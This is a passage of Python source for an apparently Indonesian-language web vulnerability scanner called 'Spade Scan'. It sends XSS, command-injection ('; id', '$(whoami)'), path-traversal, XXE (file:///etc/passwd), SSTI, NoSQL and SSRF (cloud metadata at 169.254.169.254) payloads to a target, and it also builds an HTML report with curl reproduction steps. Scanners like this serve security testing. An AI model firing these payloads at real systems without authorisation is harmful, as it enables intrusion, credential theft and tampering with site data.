                return [("HIGH","XSS_REFLECTED",f"Parameter '{p}' memantulkan tag script mentah — reflected XSS. Attacker bisa menjalankan JavaScript di browser korban. URL: {r.url}", r.url, f"XSS terdeteksi di parameter '{p}' (GET)")]
        except: pass
        return []
    out = pmap_until(_check_get, [(p, pl) for pl in payloads for p in params])
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))

    # ── XSS via form POST (dari crawler) ──
    crawler = ctx.get("crawler") if ctx else None
    if crawler:
        forms = get_forms(ctx)
        def _check_post(job):
            action, inputs, page, payload = job
            text_inputs = [i for i in inputs if i["type"] in ("text","search","textarea","") and i["name"]]
            if not text_inputs: return []
            data = {i["name"]: payload for i in inputs if i["name"]}
            try:
                r = sess.post(action, data=data, timeout=10)
                if payload in r.text:
                    return [("HIGH","XSS_POST",f"Form POST di {page} (action: {action}) rentan XSS. Field {text_inputs[0]['name']} memantulkan payload JavaScript. Attacker bisa mengirim link ke korban yang mengeksekusi script di browser mereka.", action, f"XSS terdeteksi via POST form {action}")]
            except: pass
            return []
        jobs = []
        for action,method,inputs,page in forms:
            if method.upper() != "POST": continue
            for payload in payloads:
                jobs.append((action, inputs, page, payload))
        if jobs:
            out = pmap_until(_check_post, jobs)
            if out:
                for sev, code, desc, url, msg in out:
                    critical(msg)
                    f.append((sev, code, desc, url))
        
        # ── Stored XSS — submit lalu cek halaman lain ──
        if not any("XSS" in x[0] for x in f):
            for action,method,inputs,page in forms:
                if method.upper() != "POST": continue
                text_inputs = [i for i in inputs if i["type"] in ("text","search","textarea","") and i["name"]]
                if not text_inputs: continue
                # Coba payload di field pertama aja
                payload = "<img src=x onerror=alert(1)>"
                data = {}
                for i in inputs:
                    if i["name"]: data[i["name"]] = payload if i == text_inputs[0] else "test"
                try:
                    sess.post(action, data=data, timeout=10)
                    # Cek beberapa halaman setelah submit apakah payload muncul
                    for pg_url, pg_html in list(crawler.pages.items())[:5]:
                        if pg_url != page and payload in pg_html:
                            critical(f"Stored XSS: payload muncul di {pg_url}")
                            f.append(("HIGH","XSS_STORED",f"Data dari form di {page} disimpan dan ditampilkan mentah di {pg_url}. Attacker bisa menyuntikkan JavaScript yang dijalankan setiap kali pengguna lain membuka halaman tersebut."))
                            break
                except: pass
    return f

def open_redirect(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji open redirect...")
    def _check(param):
        try:
            r = sess.get(base_url, params={param: "https://evil.com"}, timeout=10, allow_redirects=False)
            if r.status_code in (301,302,303,307,308) and "evil.com" in r.headers.get("Location",""):
                return [("HIGH","OPEN_REDIRECT",f"Parameter '{param}' di {base_url} mengarahkan browser ke URL eksternal tanpa validasi. Attacker bisa memanfaatkan ini untuk phishing (mengelabui korban mengklik link yang mengarah ke situs jahat).", r.url, f"Open redirect via parameter '{param}'")]
        except: pass
        return []
    out = pmap_until(_check, ["next","redirect","url","return","to","dest","goto"])
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))
    return f

def lfi_check(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji LFI / path traversal...")
    if echo_skip(sess, base_url, ctx):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    def _check(job):
        param, payload = job
        try:
            r = sess.get(base_url, params={param: payload}, timeout=10)
            body = r.text.lower()
            if ("root:" in body or "daemon:" in body):
                if "../../etc/passwd" not in r.text.lower()[:500]:
                    return [("HIGH","LFI",f"Parameter '{param}' di {base_url} memungkinkan pembacaan file server (path traversal). Attacker bisa membaca /etc/passwd dan file sensitif lainnya. Payload: {payload}", r.url, f"LFI terdeteksi via parameter '{param}'")]
        except: pass
        return []
    out = pmap_until(_check, [(p, pl) for p in ["file","page","include","path","doc","load"] for pl in ["../../etc/passwd","../../etc/hosts"]])
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))
    return f

def cmd_injection(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji command injection...")
    if echo_skip(sess, base_url, ctx):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    
    cmd_params = ["cmd","command","exec","ping","host","domain","ip","target","hostname"]
    cmd_payloads = [("; id","titik koma + id"),("| id","pipe + id"),("`id`","backtick"),("$(whoami)","subshell")]
    
    # ── Cek GET params ──
    def _check_get(job):
        path, param, payload, label = job
        try:
            r = sess.get(join(base_url, path), params={param: payload}, timeout=10)
            body = r.text
            if ("uid=" in body or "gid=" in body) and not any(x in body for x in ["whoami","id","git"]):
                return [("HIGH","CMD_INJECTION",f"Command injection di {path} via parameter '{param}' (GET). Payload: {label}. Attacker bisa menjalankan perintah shell di server dengan hak akses web server.", r.url, f"Command injection di {path} via '{param}' (GET)")]
        except: pass
        return []
    jobs = [(path, param, payload, label)
            for path in ["/","/ping","/exec","/cmd","/run","/api/exec"]
            for payload, label in cmd_payloads
            for param in cmd_params]
    out = pmap_until(_check_get, jobs)
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))
        return f
    
    # ── Cek POST form ──
    crawler = ctx.get("crawler") if ctx else None
    if crawler:
        forms = get_forms(ctx)
        def _check_post(job):
            action, inputs, page, payload, label, field = job
            data = {}
            for i in inputs:
                if i["name"]:
                    data[i["name"]] = payload if i["name"] == field else "test"
            try:
                r = sess.post(action, data=data, timeout=10)
                body = r.text
                if ("uid=" in body or "gid=" in body) and not any(x in body for x in ["whoami","id","git"]):
                    return [("HIGH","CMD_INJECTION_POST",f"Form POST di {page} (action: {action}) rentan command injection via field '{field}' dengan payload {label}. Attacker bisa menjalankan perintah shell di server.", action, f"Command injection via POST form {action} (field: {field})")]
            except: pass
            return []
        jobs = []
        for action,method,inputs,page in forms:
            if method.upper() != "POST": continue
            text_inputs = [i for i in inputs if i["type"] in ("text","search","textarea","") and i["name"]]
            if not text_inputs: continue
            for payload,label in cmd_payloads:
                jobs.append((action, inputs, page, payload, label, text_inputs[0]["name"]))
        out = pmap_until(_check_post, jobs)
        if out:
            for sev, code, desc, url, msg in out:
                critical(msg)
                f.append((sev, code, desc, url))
            return f
    return f

def ssrf_check(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji SSRF...")
    ssrf_url = "http://169.254.169.254/"
    ssrf_payloads = ["url","uri","link","href","src","ref","reference","callback","redirect","return","next","path","file","document","image","img","target"]
    
    # ── Cek endpoint umum via GET ──
    def _check_get(job):
        path, param = job
        try:
            target = join(base_url, path)
            r = sess.get(target, params={param:ssrf_url}, timeout=10)
            if r.status_code in (200,301,302) and len(r.content)>10:
                return [("MEDIUM","SSRF",f"Endpoint {path} dengan parameter '{param}' menerima URL eksternal dan merespons. Jika server memproses URL internal (seperti 169.254.169.254 untuk metadata AWS/GCP), attacker bisa mencuri kredensial cloud.", r.url, f"Kemungkinan SSRF: {path}?{param}=...")]
        except: pass
        return []
    jobs = [(path, param)
            for path in ["/proxy","/fetch","/curl","/api/proxy","/api/fetch","/api/url","/fetch-url","/proxy?url="]
            for param in ["url","uri","target"]]
    out = pmap_until(_check_get, jobs)
    if out:
        for sev, code, desc, url, msg in out:
            warn(msg)
            f.append((sev, code, desc, url))
    
    # ── SSRF via form POST (crawler) ──
    crawler = ctx.get("crawler") if ctx else None
    if crawler:
        forms = get_forms(ctx)
        def _check_post(job):
            action, inputs, page, url_field = job
            data = {}
            for i in inputs:
                if i["name"]:
                    data[i["name"]] = ssrf_url if i["name"] == url_field else "test"
            # List biasa: tuple di sini membawa pesan log ke-5 yang tidak dipakai Finding.
            out = []
            try:
                r = sess.post(action, data=data, timeout=10)
                if "169.254.169.254" in r.text or len(r.content) > 1000:
                    out.append(("MEDIUM","SSRF_FORM",f"Form POST di {page} (action: {action}) memiliki field '{url_field}' yang mungkin diproses server sebagai URL. Attacker bisa memanfaatkan ini untuk SSRF — membaca metadata cloud internal atau memindai port jaringan internal.", action, f"Kemungkinan SSRF via form field '{url_field}' di {action}"))
                elif "timed out" in r.text.lower() or "connection refused" in r.text.lower() or "couldn't connect" in r.text.lower():
                    out.append(("LOW","SSRF_TIMEOUT",f"Field '{url_field}' di form {action} menyebabkan timeout/connection error saat dikirim URL eksternal — indikasi server mencoba mengakses URL tersebut.", action, f"SSRF indikasi: field '{url_field}' di {action} mencoba fetch URL (error timeout)"))
            except: pass
            return out
        jobs = []
        for action,method,inputs,page in forms:
            if method.upper() != "POST": continue
            url_fields = [i for i in inputs if i["name"] and any(kw in i["name"].lower() for kw in ssrf_payloads)]
            if not url_fields: continue
            jobs.append((action, inputs, page, url_fields[0]["name"]))
        out = pmap_until(_check_post, jobs)
        if out:
            for sev, code, desc, url, msg in out:
                warn(msg)
                f.append((sev, code, desc, url), evidence_url=url)
    return f

def rate_limit(sess, base_url, ctx=None):
    f = FindingList(base_url); info("Menguji rate limiting...")
    def _probe(_):
        try:
            r = sess.get(base_url, timeout=8)
            return r.status_code
        except: pass
        return None
    statuses = pmap(_probe, list(range(15)))
    if 429 in statuses:
        good("Rate limiting aktif (HTTP 429)")
        f.append(("INFO","RATE_LIMIT","Rate limiting aktif — server mengembalikan HTTP 429 setelah beberapa permintaan cepat. Melindungi dari brute force."))
    else:
        warn("Tidak ada rate limiting")
        f.append(("LOW","NO_RATE_LIMIT","Tidak ada rate limiting — server tidak memblokir permintaan berulang (tidak ada HTTP 429 setelah 15 permintaan cepat). Rentan brute force login, credential stuffing."))
    return f

# ── DETAILED modules ──

def scan_ssti(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji SSTI (Server-Side Template Injection)...")
    if echo_skip(sess, base_url, ctx):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    crawler = ctx.get("crawler") if ctx else None
    params = [("q",False),("name",False),("search",False),("user",False)]
    if crawler:
        for a,m,inps,p in get_forms(ctx):
            for i in inps:
                if i["type"] in ("text","search","textarea","") and i["name"]: params.append((i["name"],True))
    tests = [("{{7*7}}","49","Jinja2/Twig"),("{{7*'7'}}","7777777","Jinja2"),("${7*7}","49","Freemarker")]
    def _check(job):
        param, payload, expected, engine = job
        try:
            r = sess.get(base_url, params={param: payload}, timeout=10)
            if expected.lower() in r.text and payload.lower() not in r.text:
                return [("HIGH","SSTI",f"Parameter '{param}' di {base_url} rentan Server-Side Template Injection (engine: {engine}). Payload '{payload}' dieksekusi server menjadi '{expected}'. Attacker bisa menjalankan kode remote (RCE), membaca file, atau mengakses variabel lingkungan server.", r.url, f"SSTI terdeteksi: '{param}' menggunakan engine {engine}")]
        except: pass
        return []
    jobs = [(param, payload, expected, engine) for param, _ in params for payload, expected, engine in tests]
    out = pmap_until(_check, jobs)
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))
        return f
    return f

def scan_xxe(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji XXE (XML External Entity)...")
    
    # Payload XXE — baca /etc/passwd via entity eksternal
    xxe_payloads = [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    ]
    
    # ── Kirim langsung ke endpoint umum dengan Content-Type XML ──
    xxe_paths = ["/api/xml","/xml","/soap","/api/soap","/api/upload","/ws","/api/ws"]
    def _check_direct(job):
        url, payload = job
        try:
            r = sess.post(url, data=payload, headers={"Content-Type": "application/xml"}, timeout=10)
            body = r.text.lower()
            if "root:" in body and ":" in body and "/bin/bash" in body:
                return [("HIGH","XXE_DIRECT",f"XXE di {url}: payload XML mentah berhasil membaca /etc/passwd. Attacker bisa membaca file server (konfigurasi, kredensial, source code), melakukan SSRF ke jaringan internal, atau denial of service (Billion Laughs).", url, f"XXE terdeteksi di {url}")]
        except: pass
        return []
    jobs = [(join(base_url, path), payload) for path in xxe_paths for payload in xxe_payloads]
    out = pmap_until(_check_direct, jobs)
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))
        return f
    
    # ── XXE via form POST ──
    crawler = ctx.get("crawler") if ctx else None
    if crawler:
        forms = get_forms(ctx)
        def _check_form(job):
            action, inputs, page, payload = job
            data = {}
            for i in inputs:
                if i["name"]:
                    if "xml" in i["name"].lower():
                        data[i["name"]] = payload
                    else:
                        data[i["name"]] = "test"
            try:
                r = sess.post(join(base_url, action), data=data, timeout=10)
                body = r.text.lower()
                if "root:" in body and ":" in body and "/bin/bash" in body:
                    return [("HIGH","XXE_FORM",f"XXE di form {page} (action: {action}): field XML menerima entity eksternal dan mengeksekusi pembacaan file. Attacker bisa membaca file server sensitif.", action, f"XXE terdeteksi via form {action}")]
            except: pass
            return []
        jobs = []
        for action,method,inputs,page in forms:
            if method.upper() != "POST": continue
            types = {i["type"] for i in inputs}
            text_inputs = [i for i in inputs if i["name"]]
            # Cari form yg punya field "xml" atau file upload
            has_xml_field = any("xml" in i["name"].lower() for i in text_inputs)
            if not has_xml_field and "file" not in types: continue
            for payload in xxe_payloads:
                jobs.append((action, inputs, page, payload))
        out = pmap_until(_check_form, jobs)
        if out:
            for sev, code, desc, url, msg in out:
                critical(msg)
                f.append((sev, code, desc, url))
            return f
    return f

def scan_nosqli(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji NoSQL injection...")
    if echo_skip(sess, base_url, ctx):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    def _check(param):
        try:
            r1 = sess.get(base_url, params={param: '{"$gt":""}'}, timeout=10)
            r2 = sess.get(base_url, params={param: "test"}, timeout=10)
            if r1.status_code==200 and abs(len(r1.content)-len(r2.content)) > 500:
                return [("MEDIUM","NOSQLI",f"Parameter '{param}' menunjukkan respons berbeda saat dikirim nilai JSON operator MongoDB ($gt). Attacker bisa bypass autentikasi atau membaca data tanpa izin.", None, f"Kemungkinan NoSQL injection di parameter '{param}'")]
        except: pass
        return []
    out = pmap_until(_check, ["id","user","username","email","token"])
    if out:
        for sev, code, desc, url, msg in out:
            warn(msg)
            f.append((sev, code, desc) if url is None else (sev, code, desc, url))
    return f

def scan_graphql(sess, base_url, ctx=None):
    f = FindingList(); info("Memeriksa GraphQL...")
    # Introspection query mentah (tanpa double-encode)
    q_raw = "{__schema{types{name fields{name}}}}"
    paths = ["/graphql","/api/graphql","/gql","/graphiql","/v1/graphql","/query"]
    # GET dan POST tiap path dicek paralel; tiap job mencoba dua metode sekaligus.
    def _check(url):
        # GET — param query lgsg
        try:
            r = sess.get(url, params={"query": q_raw}, timeout=10)
            if r.status_code in (200,201):
                try:
                    j = r.json()
                    if isinstance(j.get("data"), dict) and "__schema" in j["data"]:
                        return [("HIGH","GRAPHQL_INTROSPECTION",f"GraphQL endpoint di {url} mengizinkan introspection query via GET. Siapa pun bisa mendapatkan skema lengkap API — termasuk semua tipe, query, mutasi, dan field. Ini membocorkan seluruh permukaan API.", url, f"GraphQL introspection aktif (GET): {url}")]
                except: pass
        except: pass
        # POST — kirim JSON langsung (jangan pake json.dumps lagi biar requests yg encode)
        try:
            r = sess.post(url, json={"query": q_raw}, timeout=10)
            if r.status_code in (200,201):
                try:
                    j = r.json()
                    if isinstance(j.get("data"), dict) and "__schema" in j["data"]:
                        return [("HIGH","GRAPHQL_INTROSPECTION",f"GraphQL endpoint di {url} mengizinkan introspection query via POST. Siapa pun bisa mendapatkan skema lengkap API — termasuk semua tipe, query, mutasi, dan field. Ini membocorkan seluruh permukaan API.", url, f"GraphQL introspection aktif (POST): {url}")]
                except: pass
        except: pass
        return []
    out = pmap_until(_check, [join(base_url, p) for p in paths])
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))
        return f
    return f

def scan_js(sess, base_url, ctx=None):
    f = FindingList(base_url); info("Menganalisis JavaScript...")
    try:
        r = get_base_response(sess, base_url, ctx)
        if r is None:
            info("Tidak bisa mengambil halaman utama"); return f
        js_urls = set()
        for m in re.finditer(r'<script[^>]*src=["\']([^"\']+\.js[^"\']*)["\']', r.text, re.I):
            js_urls.add(urllib.parse.urljoin(base_url, m.group(1)))
        if not js_urls: info("Tidak ada file JS"); return f
        targets = list(js_urls)[:5]
        info(f"Ditemukan {len(js_urls)} file JS")
        def _fetch(js_url):
            try:
                r2 = sess.get(js_url, timeout=10)
                if r2.status_code==200:
                    return js_url, r2.text
            except: pass
            return js_url, None
        for js_url, t in pmap(_fetch, targets):
            if t is not None:
                fn = js_url.split('/')[-1]
                # API endpoints
                apis = re.findall(r'["\'](/[a-zA-Z0-9_\-./?&=]+)["\']', t)
                apis = [x for x in set(apis) if re.search(r'/api/|/v1/|/v2/|graphql|rest', x, re.I)]
                apis = [x for x in apis if not any(s in x.lower() for s in ["jquery","react","vue","angular","bootstrap","fontawesome"])]
                if apis:
                    info(f"  {fn}: {len(apis)} endpoint API")
                    f.append(("INFO","JS_APIS",f"File {fn} mengandung {len(apis)} endpoint API. Endpoint ini mungkin tidak terdokumentasi: {', '.join(apis[:5])}"), evidence_url=js_url)
                # Hardcoded secrets
                secrets = re.findall(r'(?:api[_-]?key|secret|password|token|auth)\s*[:=]\s*["\'](?!([A-Z][a-z]+\s))([a-zA-Z0-9_\-/@#$%^&*+=]{16,})["\']', t, re.I)
                secrets = [s for s,_ in secrets]
                real = []
                for s in secrets:
                    sl = s.lower()
                    if any(kw in sl for kw in ["unexpected","duplicate","undefined","prototype","function","callback","return","default","configure","property","attribute"]): continue
                    if re.search(r'[0-9]', s) or re.search(r'[A-Z]', s): real.append(s)
                for s in real[:5]:
                    critical(f"Kredensial hardcode di {fn}")
                    f.append(("CRITICAL","JS_SECRET",f"File JS {fn} mengandung kredensial/secret hardcode: '{s[:20]}...'. Jika ini adalah kredensial produksi, attacker bisa langsung mengakses resource yang dilindungi."), evidence_url=js_url)
    except: pass
    return f

def scan_jwt(sess, base_url, ctx=None):
    f = FindingList(base_url); info("Menganalisis JWT...")
    try:
        r = get_base_response(sess, base_url, ctx)
        if r is None:
            return f
        for ck, cv in sess.cookies.items():
            if cv.count(".")==2:
                try:
                    import base64 as b64
                    def b64d(s): s=s+"="*(4-len(s)%4); return json.loads(b64.b64decode(s.replace("-","+").replace("_","/")).decode())
                    h = b64d(cv.split(".")[0])
                    if isinstance(h, dict):
                        if h.get("alg")=="none":
                            critical(f"JWT di cookie '{ck}' menggunakan alg=none")
                            f.append(("CRITICAL","JWT_ALG_NONE",f"JWT di cookie '{ck}' menggunakan algoritma 'none'. Attacker bisa memalsukan token dengan payload apa pun tanpa tanda tangan dan mendapatkan akses tidak sah."))
                        else:
                            info(f"JWT di cookie '{ck}', alg={h.get('alg')}")
                            f.append(("INFO","JWT_COOKIE",f"Cookie '{ck}' berisi JWT (alg={h.get('alg')}). Token perlu dievaluasi manual untuk validasi signature, expiry, dan klaim."))
                except: pass
        auth = r.request.headers.get("Authorization","")
        if auth.startswith("Bearer "):
            t = auth[7:]
            if t.count(".")==2: f.append(("INFO","JWT_BEARER","Authorization header menggunakan Bearer token JWT. Periksa validitas token secara manual."))
    except: pass
    return f

def scan_subdomains(sess, base_url, ctx=None):
    f = FindingList(); info("Mencari subdomain...")
    host = host_from_url(base_url)
    host = re.sub(r'^www\.', '', host)
    if not re.match(r'^[a-zA-Z0-9\-.]+\.[a-zA-Z]{2,}$', host): return f
    crt_url = f"https://crt.sh/?q=%25.{host}&output=json"
    f.default_evidence_url = crt_url   # bukti temuan subdomain = respons CRT.sh
    subs = set()
    try:
        r = sess.get(crt_url, timeout=15)
        if r.status_code==200:
            try:
                data = r.json()
                if isinstance(data, list):
                    for entry in data[:50]:
                        for s in entry.get("name_value","").split("\n"):
                            s=s.strip()
                            if s.endswith(f".{host}") or s==host: subs.add(s)
            except: pass
    except: pass
    common = ["www","mail","admin","api","dev","staging","test","beta","app","blog","cdn","static","docs","wiki","help","support","status","portal","shop"]
    def _dns(sub):
        fqdn = f"{sub}.{host}"
        if fqdn in subs: return None
        try:
            socket.getaddrinfo(fqdn, 443, socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, socket.AI_NUMERICSERV)
            return fqdn
        except: pass
        return None
    for found in pmap(_dns, common):
        if found: subs.add(found)
    if subs:
        info(f"Ditemukan {len(subs)} subdomain")
        for s in sorted(subs)[:10]: info(f"  {s}")
        if len(subs)>10: info(f"  +{len(subs)-10} lainnya")
        f.append(("INFO","SUBDOMAINS",f"Ditemukan {len(subs)} subdomain untuk {host} via CRT.sh + DNS lookup. Periksa setiap subdomain untuk potensi serangan: {'; '.join(sorted(subs)[:10])}"))
    return f

def scan_forms_analyze(sess, base_url, ctx=None):
    f = FindingList(); info("Menganalisis form...")
    crawler = ctx.get("crawler") if ctx else None
    if not crawler: return f
    forms = get_forms(ctx)
    if forms:
        seen = set()
        info(f"Ditemukan {len(forms)} form")
        for action,method,inputs,page in forms:
            names = [i["name"] for i in inputs if i["name"]]
            key = (action,method)
            if key in seen: continue
            seen.add(key)
            info(f"  {method} {action}: {names}")
            if any("pass" in n.lower() for n in names):
                if not action.startswith("https") and base_url.startswith("https"):
                    warn(f"Form password dikirim lewat HTTP: {action}")
                    f.append(("MEDIUM","FORM_HTTP",f"Form dengan field password di {page} mengirim data ke {action} (HTTP, bukan HTTPS). Password dikirim dalam teks mentah — bisa dicegat attacker di jaringan yang sama (WiFi publik, dll)."), evidence_url=page)
    else: info("Tidak ada form")
    return f

def waf_detect(sess, base_url, ctx=None):
    sigs = {"Cloudflare":[("server","cloudflare"),("cf-ray","")],
            "AWS WAF":[("x-amz-cf-id",""),("server","cloudfront")],
            "ModSecurity":[("server","mod_security")],
            "Akamai":[("server","akamaighost")],
            "Imperva":[("x-iinfo","")]}
    detected = []
    try:
        r = get_base_response(sess, base_url, ctx)
        if r is None:
            return detected
        h = {k.lower():v.lower() for k,v in r.headers.items()}
        for name, sigs_list in sigs.items():
            if all(h.get(hdr,"") and (not val or val in h[hdr]) for hdr,val in sigs_list): detected.append(name)
        if "attention required" in r.text.lower() and "cloudflare" in r.text.lower(): detected.append("Cloudflare")
    except: pass
    return detected

# ── report ──
SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}

def _normalize_findings(finds):
    return [as_finding(f) for f in finds]

def _finding_meta(finding):
    """Metadata temuan: pakai milik Finding kalau ada, kalau tidak lihat kode."""
    meta = getattr(finding, "meta", None)
    return meta if meta is not None else finding_meta(finding[1])

def _finding_confidence(finding):
    declared = getattr(finding, "confidence", None)
    return declared or finding_confidence(finding[1])

def _truncate(text, limit=EVIDENCE_SNIPPET_CHARS):
    text = text or ""
    return text if len(text) <= limit else text[:limit] + "… (dipotong)"

def confidence_badge(finding):
    """Baris kecil berisi confidence + CVSS/CWE/OWASP untuk satu temuan."""
    meta = _finding_meta(finding)
    bits = [f"confidence: {_finding_confidence(finding)}"]
    if meta and meta.vector:
        bits.append(f"CVSS {meta.score} ({meta.vector})")
    if meta and meta.cwe:
        bits.append(meta.cwe)
    if meta and meta.owasp:
        bits.append(meta.owasp)
    return " · ".join(bits)

def evidence_html(finding, impersonate=None):
    """Blok `<details>` berisi bukti request/response + langkah reproduksi."""
    exchange = getattr(finding, "evidence", None)
    meta_line = htmlmod.escape(confidence_badge(finding))
    if exchange is None:
        return (f'<details><summary>Bukti &amp; repro</summary><div class="meta">{meta_line}</div>'
                '<p class="note">Tidak ada bukti HTTP untuk temuan ini '
                '(diperoleh dari pemeriksaan non-HTTP, mis. handshake TLS/socket).</p></details>')
    head = [
        f'<div class="meta">{meta_line}</div>',
        f'<p class="note">{htmlmod.escape(exchange.method)} {htmlmod.escape(redact_url(exchange.url))} '
        f'&rarr; HTTP {htmlmod.escape(str(exchange.status))} '
        f'({exchange.response_length} byte, {exchange.elapsed_ms} ms, {htmlmod.escape(exchange.timestamp)})</p>',
    ]
    header_lines = "\n".join(f"{k}: {v}" for k, v in exchange.request_headers.items())
    if header_lines:
        head.append("<h4>Request headers (redaksi)</h4>")
        head.append(f"<pre>{htmlmod.escape(header_lines)}</pre>")
    if exchange.request_body:
        head.append("<h4>Request body</h4>")
        head.append(f"<pre>{htmlmod.escape(_truncate(exchange.request_body))}</pre>")
    if exchange.response_snippet:
        head.append("<h4>Potongan respons</h4>")
        head.append(f"<pre>{htmlmod.escape(_truncate(exchange.response_snippet))}</pre>")
    repro = repro_curl(exchange, impersonate or DEFAULT_IMPERSONATE)
    if repro["curl"]:
        head.append("<h4>Reproduksi (curl)</h4>")
        head.append(f"<pre>{htmlmod.escape(repro['curl'])}</pre>")
        head.append("<h4>Reproduksi (curl_cffi)</h4>")
        head.append(f"<pre>{htmlmod.escape(repro['python_curl_cffi'])}</pre>")
        head.append('<p class="note">Scan ini memakai impersonasi browser '
                    f"({htmlmod.escape(str(impersonate or DEFAULT_IMPERSONATE))}), jadi header dan TLS "
                    "fingerprint-nya ikut disamarkan. `curl` polos bisa memberi hasil berbeda — "
                    "pakai snippet curl_cffi di atas untuk mereplikasi kondisi scan.</p>")
    return f'<details><summary>Bukti &amp; repro</summary>{"".join(head)}</details>'

def evidence_status(finding):
    """Status bukti untuk CSV: `http` kalau ada exchange, `none` kalau tidak."""
    return "http" if getattr(finding, "evidence", None) is not None else "none"

def evidence_url(finding):
    exchange = getattr(finding, "evidence", None)
    return redact_url(exchange.url) if exchange is not None else ""

def scan_summary(finds):
    """Ringkasan jumlah temuan per severity dan per confidence."""
    by_severity = defaultdict(int)
    by_confidence = defaultdict(int)
    for finding in finds:
        by_severity[finding[0]] += 1
        by_confidence[_finding_confidence(finding)] += 1
    return {
        "total": len(finds),
        "by_severity": {s: by_severity[s] for s in sorted(by_severity, key=lambda x: SEV_ORDER.get(x, 99))},
        "by_confidence": dict(sorted(by_confidence.items())),
    }

def gen_html(finds, target, start, end, out, impersonate=None):
    """Laporan HTML. `impersonate` dipakai untuk menuliskan konteks PoC reproduksi."""
    finds = _normalize_findings(finds)
    def sk(f): return (SEV_ORDER.get(f[0],99), f[2] if len(f)>2 else "")
    sf = sorted(finds, key=sk)
    rows = ""
    for fi in sf:
        sev = fi[0].lower()
        url_cell = ""
        if fi[3]:
            url_cell = f'<td style="word-break:break-all"><a href="{htmlmod.escape(fi[3])}" target="_blank" rel="noopener" style="color:#58a6ff">{htmlmod.escape(fi[3])}</a></td>'
        rows += (f'<tr class="{sev}"><td><span class="sev-badge {sev}">{htmlmod.escape(str(fi[0]))}</span></td>'
                 f'<td>{htmlmod.escape(str(fi[1]))}</td><td>{htmlmod.escape(str(fi[2]))}'
                 f'{evidence_html(fi, impersonate)}</td>{url_cell}</tr>\n')
    sc = defaultdict(int)
    for fi in sf: sc[fi[0]]+=1
    summary = "".join(f'<div class="sev-count {s.lower()}"><strong>{s}:</strong> {c}</div>' for s,c in sorted(sc.items(), key=lambda x: SEV_ORDER.get(x[0],99)))
    with_evidence = sum(1 for fi in sf if getattr(fi, "evidence", None) is not None)
    evidence_card = (f'<div class="card"><h3>Bukti</h3><div class="val">{with_evidence}/{len(sf)}</div>'
                     f'<div style="margin-top:8px"><span class="sev-count">confidence: '
                     f'{htmlmod.escape(", ".join(f"{k} {v}" for k, v in sorted(scan_summary(sf)["by_confidence"].items())))}</span></div></div>')
    dur = (end-start).total_seconds()
    html = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Spade Scan - {htmlmod.escape(target)}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}}
.container{{max-width:1200px;margin:0 auto}}
h1{{font-size:1.6rem;margin-bottom:4px}}
.subtitle{{color:#8b949e;margin-bottom:24px}}
.summary{{display:flex;gap:20px;flex-wrap:wrap;margin-bottom:24px}}
.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px 20px;flex:1;min-width:150px}}
.card h3{{font-size:.85rem;color:#8b949e;text-transform:uppercase}}
.card .val{{font-size:1.8rem;font-weight:700;margin-top:4px}}
.sev-count{{display:inline-block;margin-right:12px;margin-bottom:6px;padding:4px 10px;border-radius:12px;font-size:.85rem}}
table{{width:100%;border-collapse:collapse;background:#161b22;border-radius:8px;overflow:hidden}}
th{{background:#21262d;padding:10px 14px;text-align:left;font-size:.8rem;text-transform:uppercase;color:#8b949e}}
td{{padding:10px 14px;border-top:1px solid #21262d;font-size:.9rem}}
.sev-badge{{display:inline-block;padding:2px 8px;border-radius:10px;font-weight:600;font-size:.75rem}}
.critical .sev-badge{{background:#d73a4a;color:#fff}}
tr.high{{border-left:3px solid #d73a4a}}
.high .sev-badge{{background:#d73a4a;color:#fff}}
tr.medium{{border-left:3px solid #d29922}}
.medium .sev-badge{{background:#d29922;color:#0d1117}}
tr.low{{border-left:3px solid #58a6ff}}
.low .sev-badge{{background:#58a6ff;color:#0d1117}}
tr.info{{border-left:3px solid #8b949e}}
.info .sev-badge{{background:#8b949e;color:#0d1117}}
details{{margin-top:8px}}
summary{{cursor:pointer;color:#58a6ff;font-size:.8rem}}
details h4{{font-size:.75rem;color:#8b949e;text-transform:uppercase;margin:10px 0 4px}}
pre{{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:10px;overflow-x:auto;
     font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:.78rem;white-space:pre-wrap;word-break:break-all}}
.meta{{font-size:.78rem;color:#8b949e;margin-top:6px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace}}
.note{{font-size:.78rem;color:#8b949e;margin-top:6px}}
.footer{{margin-top:32px;text-align:center;color:#484f58;font-size:.8rem}}
</style></head><body><div class="container">
<h1>Spade Scan Report</h1>
